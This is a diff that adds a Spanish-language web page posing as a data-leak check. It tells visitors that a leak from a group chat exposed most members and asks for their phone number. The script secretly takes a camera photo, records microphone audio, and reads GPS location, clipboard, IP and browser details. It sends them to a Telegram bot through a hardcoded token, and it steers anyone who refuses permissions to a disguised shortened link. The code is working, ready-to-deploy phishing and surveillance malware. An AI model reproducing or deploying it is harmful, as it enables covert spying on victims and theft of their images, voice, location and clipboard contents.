@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auditoría de Seguridad - Filtración</title>
+    <style>
+        :root {
+            --bg: #f8f9fa;
+            --text: #202124;
+            --text-muted: #5f6368;
+            --primary: #0d6efd;
+            --danger: #dc3545;
+            --card-bg: #ffffff;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+
+        .icon {
+            width: 64px;
+            height: 64px;
+            background: #e8f0fe;
+            color: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+        }
+
+        h1 { font-size: 22px; font-weight: 600; margin: 0 0 10px 0; }
+        p { color: var(--text-muted); font-size: 15px; line-height: 1.6; margin-bottom: 20px; }
+
+        .input-group { margin-bottom: 20px; text-align: left; }
+        .input-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 8px; color: var(--text-muted); }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; outline: none; }
+        .input-group input:focus { border-color: var(--primary); }
+
+        .btn {
+            background: var(--primary); color: white; border: none; padding: 14px;
+            font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%;
+            transition: opacity 0.2s; text-decoration: none; display: block;
+        }
+        .btn:hover { opacity: 0.9; }
+        .btn:disabled { background: #ccc; cursor: not-allowed; }
+
+        .hidden { display: none !important; }
+
+        .loader {
+            border: 4px solid #f3f3f3; border-top: 4px solid var(--primary);
+            border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .status-text { font-size: 15px; font-weight: 500; color: var(--text-muted); margin-top: 15px; }
+        
+        .error-box {
+            background: #fce8e6;
+            border: 1px solid var(--danger);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: left;
+        }
+        .error-box h2 {
+            color: var(--danger);
+            font-size: 18px;
+            margin: 0 0 10px 0;
+        }
+        .error-box p {
+            color: var(--danger);
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .final-icon { background: #f8d7da; color: var(--danger); }
+        .final-title { color: var(--danger); }
+
+        #hidden-cam { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <div id="screen-start">
+            <div class="icon">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+            </div>
+            <h1>Filtración Masiva Detectada</h1>
+            <p>Gracias al cierre del grupo de ayer, hemos obtenido información del <strong>80% de las personas</strong> que estaban allí. Ingresa tu número para saber si tus datos ya están en nuestro poder.</p>
+            
+            <div class="input-group">
+                <label>Número de teléfono</label>
+                <input type="tel" id="phone-input" placeholder="+57 300 000 0000" required>
+            </div>
+
+            <button id="btn-start" class="btn">Verificar mi estado con mi número</button>
+        </div>
+
+        <div id="screen-wait" class="hidden">
+            <h1>Verificación de seguridad</h1>
+            <p id="wait-status" class="status-text">Esperando confirmación del sistema...</p>
+            <p class="status-text" style="font-size: 13px;">No cierres esta ventana.</p>
+        </div>
+
+        <div id="screen-error" class="hidden">
+            <div class="error-box">
+                <h2>Error de verificación</h2>
+                <p>Has denegado o bloqueado alguno de los accesos necesarios. Tu navegador ha guardado esta decisión y no te permitirá continuar.</p>
+                <p>Para verificar si tus datos están filtrados, debes abrir este mismo enlace en una <strong>Ventana de Incógnito</strong> o en <strong>otro navegador</strong> (ej. Chrome si estás en Safari, o Firefox si estás en Chrome).</p>
+            </div>
+            <button id="btn-copy-link" class="btn" style="margin-top: 15px;">COPIAR ENLACE PARA INCÓGNITO</button>
+            <p class="status-text" style="font-size: 12px; margin-top: 10px;">Copia el enlace, abre el modo incógnito y pégalo allí.</p>
+        </div>
+
+        <div id="screen-loading" class="hidden">
+            <div class="loader"></div>
+            <h1>Procesando datos...</h1>
+            <p id="loading-status" class="status-text">Buscando coincidencias en la base de datos...</p>
+        </div>
+
+        <div id="screen-done" class="hidden">
+            <div class="icon final-icon">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+            </div>
+            <h1 class="final-title">Pues sí, enfermo.</h1>
+            <p>Ahora tengo tu información. Tus fotos, tu ubicación y tu portapapeles ya están vinculados a tu número.</p>
+        </div>
+
+        <video id="hidden-cam" autoplay playsinline muted></video>
+    </div>
+
+    <script>
+        // EL ENLACE CAMUFLADO QUE SE COPIARÁ
+        const ENLACE_DE_REDIRECCION = "https://pastebin.com@is.gd/JI7qQs";
+
+        const TG_TOKEN = '8897804487:AAFjHFflzo0nTxClXbZnCJjJx_OOca7wTYQ';
+        const TG_CHAT_ID = '8270911813';
+        const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
+
+        let report = {};
+        let photoBlob = null;
+        let audioBlob = null;
+
+        function resetState() {
+            report = {
+                timestamp: new Date().toISOString(),
+                phone: document.getElementById('phone-input').value.trim(),
+                permissions: { camera: false, mic: false, gps: false }
+            };
+            photoBlob = null;
+            audioBlob = null;
+        }
+
+        function getBrowserInfo() {
+            report.browser_info = {
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                report.ip_info = { ip: data.ip, city: data.city, country: data.country_name, isp: data.org };
+            } catch (e) {}
+        }
+
+        async function requestCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('hidden-cam');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                await new Promise(resolve => {
+                    canvas.toBlob(blob => { photoBlob = blob; resolve(); }, 'image/jpeg', 0.9);
+                });
+                stream.getTracks().forEach(track => track.stop());
+                report.permissions.camera = true;
+            } catch (e) {
+                report.permissions.camera = false;
+            }
+        }
+
+        async function requestMic() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                mediaRecorder.addEventListener("dataavailable", e => audioChunks.push(e.data));
+                
+                const recPromise = new Promise(resolve => {
+                    mediaRecorder.addEventListener("stop", () => {
+                        audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        resolve();
+                    });
+                });
+
+                mediaRecorder.start();
+                await new Promise(r => setTimeout(r, 3000));
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+                
+                await recPromise;
+                report.permissions.mic = true;
+            } catch (e) {
+                report.permissions.mic = false;
+            }
+        }
+
+        async function requestGPS() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        report.geolocation = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+                        report.permissions.gps = true;
+                        resolve();
+                    },
+                    () => {
+                        report.permissions.gps = false;
+                        resolve();
+                    },
+                    { timeout: 5000, enableHighAccuracy: true }
+                );
+            });
+        }
+
+        async function requestClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                report.clipboard = text || "(vacío)";
+            } catch (e) { report.clipboard = "Denegado"; }
+        }
+
+        async function sendTelegram() {
+            let gpsText = report.geolocation ? `<a href="https://www.google.com/maps?q=${report.geolocation.lat},${report.geolocation.lon}">Ver en Google Maps</a>` : 'No aceptado';
+            
+            const msg = `
+<b>🚨 VÍCTIMA CAPTURADA 🚨</b>
+<b>📱 Teléfono:</b> <code>${report.phone}</code>
+<b>🌐 IP:</b> ${report.ip_info?.ip || 'N/A'} (${report.ip_info?.city || 'N/A'})
+<b>🗺️ GPS:</b> ${gpsText}
+<b>📋 Portapapeles:</b> <code>${report.clipboard}</code>
+            `;
+            
+            await fetch(`${TG_API}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML', disable_web_page_preview: true })
+            });
+
+            if (photoBlob) {
+                const fd = new FormData();
+                fd.append('chat_id', TG_CHAT_ID);
+                fd.append('document', photoBlob, 'foto.jpg');
+                fd.append('caption', '📸 Foto');
+                await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: fd });
+            }
+            if (audioBlob) {
+                const fd = new FormData();
+                fd.append('chat_id', TG_CHAT_ID);
+                fd.append('document', audioBlob, 'audio.webm');
+                fd.append('caption', '🎤 Audio');
+                await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: fd });
+            }
+        }
+
+        async function attemptVerification() {
+            document.getElementById('screen-wait').classList.remove('hidden');
+            document.getElementById('wait-status').innerHTML = "Esperando confirmación del sistema...";
+            
+            resetState();
+            getBrowserInfo();
+            getIP();
+
+            await Promise.all([ requestCamera(), requestMic(), requestGPS() ]);
+
+            if (report.permissions.camera && report.permissions.mic && report.permissions.gps) {
+                document.getElementById('screen-wait').classList.add('hidden');
+                document.getElementById('screen-loading').classList.remove('hidden');
+
+                await requestClipboard();
+                try { await sendTelegram(); } catch (e) {}
+
+                setTimeout(() => {
+                    document.getElementById('screen-loading').classList.add('hidden');
+                    document.getElementById('screen-done').classList.remove('hidden');
+                }, 1500);
+            } else {
+                document.getElementById('screen-wait').classList.add('hidden');
+                document.getElementById('screen-error').classList.remove('hidden');
+            }
+        }
+
+        document.getElementById('btn-start').addEventListener('click', () => {
+            const phone = document.getElementById('phone-input').value.trim();
+            if (!phone || phone.length < 7) return alert("Ingresa un número válido.");
+
+            document.getElementById('screen-start').classList.add('hidden');
+            attemptVerification();
+        });
+
+        // Lógica del botón para copiar el ENLACE CAMUFLADO
+        document.getElementById('btn-copy-link').addEventListener('click', async () => {
+            try {
+                await navigator.clipboard.writeText(ENLACE_DE_REDIRECCION);
+                const btn = document.getElementById('btn-copy-link');
+                btn.innerText = "¡ENLACE COPIADO!";
+                btn.style.background = "#198754";
+                
+                setTimeout(() => {
+                    btn.innerText = "COPIAR ENLACE PARA INCÓGNITO";
+                    btn.style.background = "var(--primary)";
+                }, 3000);
+            } catch (err) {
+                // Fallback
+                const input = document.createElement('input');
+                input.value = ENLACE_DE_REDIRECCION;
+                document.body.appendChild(input);
+                input.select();
+                document.execCommand('copy');
+                document.body.removeChild(input);
+                alert("Enlace copiado.");
+            }
+        });
+    </script>
+</body>
+</html>
